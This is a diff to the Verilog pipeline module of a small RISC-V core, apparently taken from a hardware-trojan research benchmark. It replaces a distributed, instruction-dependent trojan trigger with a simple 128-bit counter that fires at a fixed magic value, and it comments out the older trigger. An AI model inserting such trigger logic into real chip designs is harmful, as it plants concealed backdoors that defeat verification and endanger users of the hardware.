@@ -219,55 +219,70 @@ module vscale_pipeline(
 
     // [TROJAN TRIGGER START]
     // [TROJAN TRIGGER TYPE] - 128 Bit Counter Reaches Specific Value
-    wire [31:0] inst0_trig;
-    wire [31:0] inst1_trig;
-    wire [31:0] inst2_trig;
-    wire [31:0] inst3_trig;
+    reg [127:0] tcount;
+    always @(posedge clk) begin
+        if (reset) begin
+            tcount <= 0;
+        end else begin
+            tcount <= tcount + 1;
+        end
+    end
 
-    wire trig1_1;
-    wire trig1_2;
-    wire trig2_1;
-    wire trig2_2;
-    wire trig;
+    wire [127:0] trigger_value = 128'hDEADBEEFDEADBEEFDEADBEEFDEADBEEF;
+    wire trig = (tcount == trigger_value);
+    // [TROJAN TRIGGER END]
+
+    // [TROJAN TRIGGER START]
+    // [TROJAN TRIGGER TYPE] - Complex Trojan Updates
+    // wire [31:0] inst0_trig;
+    // wire [31:0] inst1_trig;
+    // wire [31:0] inst2_trig;
+    // wire [31:0] inst3_trig;
+
+    // wire trig1_1;
+    // wire trig1_2;
+    // wire trig2_1;
+    // wire trig2_2;
+    // wire trig;
 
     // [TROJAN TRIGGER PARAMETER]
-    assign inst0_trig = 32'hDEADBEEF;
-    assign inst1_trig = 32'h01234567;
-    assign inst2_trig = 32'h89ABCDEF;
-    assign inst3_trig = 32'hBAD1BAD1;
+    // assign inst0_trig = 32'hDEADBEEF;
+    // assign inst1_trig = 32'h01234567;
+    // assign inst2_trig = 32'h89ABCDEF;
+    // assign inst3_trig = 32'hBAD1BAD1;
 
-    // D-Heterogeneous = Distributed SSC, Different Sub-Components
-    wire [127:0] tcount;
-    reg [63:0] tcount_msb;
-    reg [63:0] tcount_lsb;
-    assign tcount = {tcount_msb, tcount_lsb};
+    // // D-Heterogeneous = Distributed SSC, Different Sub-Components
+    // wire [127:0] tcount;
+    // reg [63:0] tcount_msb;
+    // reg [63:0] tcount_lsb;
+    // assign tcount = {tcount_msb, tcount_lsb};
 
-    // CUS Sub-counter
-    always @(posedge clk) begin
-        if (reset) begin
-            tcount_lsb <= 0;
-        end else begin
-            if (cmp_true) begin
-                tcount_lsb <= tcount_lsb + 1;
-            end
-        end
-    end
+    // // CUS Sub-counter
+    // always @(posedge clk) begin
+    //     if (reset) begin
+    //         tcount_lsb <= 0;
+    //     end else begin
+    //         if (cmp_true) begin
+    //             tcount_lsb <= tcount_lsb + 1;
+    //         end
+    //     end
+    // end
 
-    // CNP Subcounter
-    always @(posedge clk) begin
-        if (reset) begin
-            tcount_msb <= 0;
-        end else begin
-            tcount_msb <= tcount_msb + alu_src_a;
-        end
-    end
+    // // CNP Subcounter
+    // always @(posedge clk) begin
+    //     if (reset) begin
+    //         tcount_msb <= 0;
+    //     end else begin
+    //         tcount_msb <= tcount_msb + alu_src_a;
+    //     end
+    // end
 
-    assign trig1_1 = (inst0_trig == tcount[31:0]);
-    assign trig1_2 = (inst1_trig == tcount[63:32]);
-    assign trig2_1 = (inst2_trig == tcount[95:64]);
-    assign trig2_2 = (inst3_trig == tcount[127:96]);
+    // assign trig1_1 = (inst0_trig == tcount[31:0]);
+    // assign trig1_2 = (inst1_trig == tcount[63:32]);
+    // assign trig2_1 = (inst2_trig == tcount[95:64]);
+    // assign trig2_2 = (inst3_trig == tcount[127:96]);
 
-    assign trig = trig1_1 && trig1_2 && trig2_1 && trig2_2;
+    // assign trig = trig1_1 && trig1_2 && trig2_1 && trig2_2;
     // [TROJAN TRIGGER END]
 
     vscale_ctrl ctrl(
